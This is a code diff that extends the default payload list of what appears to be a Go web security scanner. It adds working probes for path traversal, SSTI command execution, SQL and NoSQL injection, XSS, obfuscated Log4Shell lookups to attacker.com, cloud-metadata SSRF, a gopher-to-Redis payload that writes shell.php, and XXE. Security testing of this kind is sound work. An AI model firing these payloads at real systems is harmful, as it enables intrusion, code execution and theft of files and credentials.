@@ -527,16 +527,155 @@ func getDefaultConfig() *Config {
 			MaxDepth:   5,
 			TestEndpoints: true,
 			TestPayloads: []string{
+				// Path Traversal and File Inclusion
 				"../../../../etc/passwd",
+				"../../../../etc/shadow",
 				"../../../../windows/win.ini",
+				"../../../../windows/system32/config/SAM",
+				"..\\..\\..\\..\\windows\\win.ini",
+				"/etc/passwd",
+				"C:\\Windows\\System32\\drivers\\etc\\hosts",
+				"file:///etc/passwd",
+				"php://filter/resource=/etc/passwd",
+				
+				// Template Injection
 				"{{7*7}}",
+				"{{7*'7'}}",
+				"{{config}}",
+				"{{self}}",
 				"${7*7}",
+				"#{7*7}",
+				"${{7*7}}",
+				"<%= 7*7 %>",
+				"${{\"{{\"}}7*7{{\"}}\"}}",
+				
+				// XSS Payloads
 				"<script>alert(1)</script>",
+				"<img src=x onerror=alert(1)>",
+				"<svg onload=alert(1)>",
+				"javascript:alert(1)",
+				"\" onmouseover=\"alert(1)",
+				"' onfocus='alert(1)' autofocus",
+				"</script><script>alert(1)</script>",
+				
+				// SQL Injection
 				"' OR '1'='1",
+				"\" OR \"1\"=\"1",
 				"admin'--",
+				"admin' #",
+				"' UNION SELECT NULL--",
+				"1' AND SLEEP(5)--",
 				"1; SELECT SLEEP(5)",
-				"${jndi:ldap://attacker.com/a}",
+				"1' OR '1'='1'--",
+				"1' WAITFOR DELAY '0:0:5'--",
+				
+				// Command Injection
 				"||ping -c 10 127.0.0.1||",
+				"|ping -n 10 127.0.0.1|",
+				"&ping -n 10 127.0.0.1&",
+				";sleep 5;",
+				"`sleep 5`",
+				"$(sleep 5)",
+				"{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
+				
+				// Log4Shell / JNDI Injection
+				"${jndi:ldap://attacker.com/a}",
+				"${jndi:ldap://${hostName}.attacker.com/a}",
+				"${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/a}",
+				"${jndi:dns://attacker.com/a}",
+				"${jndi:rmi://attacker.com/a}",
+				
+				// SSTI (Server-Side Template Injection)
+				"${{\"{{\"}}.__class__.__base__.__subclasses__(){{\"}}\"}}",
+				"{{''.__class__.__mro__[1].__subclasses__()}}",
+				"<%= system(\"whoami\") %>",
+				"#{7*7}",
+				"${{<%[%\"'%}}%\\",
+				
+				// XXE (XML External Entity)
+				"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
+				"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+				
+				// NoSQL Injection
+				"\" || \"1\"==\"1",
+				"' || 1==1//",
+				"{\"$where\": \"sleep(5000)\"}",
+				"admin' || 'a'=='a",
+				
+				// SSRF (Server-Side Request Forgery)
+				"http://localhost:8080/admin",
+				"http://169.254.169.254/latest/meta-data/",
+				"http://[::1]:8080/",
+				"file:///etc/passwd",
+				"gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$30%0d%0a%0a%0a%3Cscript%3Ealert(1)%3C/script%3E%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a",
+				
+				// CRLF Injection
+				"test\r\nSet-Cookie: malicious=injected",
+				"test%0d%0aSet-Cookie:%20malicious=injected",
+				"\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
+				
+				// Open Redirect
+				"https://evil.com",
+				"//evil.com",
+				"/\\evil.com",
+				"http://google.com@evil.com",
+				
+				// Prototype Pollution
+				"__proto__[polluted]=true",
+				"constructor[prototype][polluted]=true",
+				"{\"__proto__\": {\"polluted\": \"yes\"}}",
+				
+				// GraphQL Injection
+				"{__schema{types{name}}}",
+				"query { users { id, email, password } }",
+				"query { __typename }",
+				
+				// JWT Tampering
+				"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+				"{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"iat\":1516239022}.",
+				
+				// Special Characters and Encoding
+				"%00",
+				"%0a",
+				"%0d",
+				"%09",
+				"../",
+				"..;/",
+				"..\\",
+				"....//",
+				"....\\/",
+				
+				// IDOR / Object Reference
+				"../../otheruser/data",
+				"1",
+				"0",
+				"-1",
+				"999999",
+				"true",
+				"false",
+				"null",
+				"undefined",
+				
+				// Business Logic Bypass
+				"price=0",
+				"quantity=-1",
+				"discount=100",
+				"admin=true",
+				"role=administrator",
+				"is_admin=1",
+				
+				// Time-based Detection
+				"';WAITFOR DELAY '00:00:05'--",
+				"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+				"||sleep(5)",
+				"{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('sleep 5').read() }}",
+				
+				// Bypass Attempts
+				"../../etc/passwd%00",
+				"..\\..\\windows\\win.ini%00",
+				"<scr<script>ipt>alert(1)</script>",
+				"' OoRr '1'='1",
+				"${jn${lower:d}i:ldap://attacker.com/a}",
 			},
 		},
 		Output: struct {
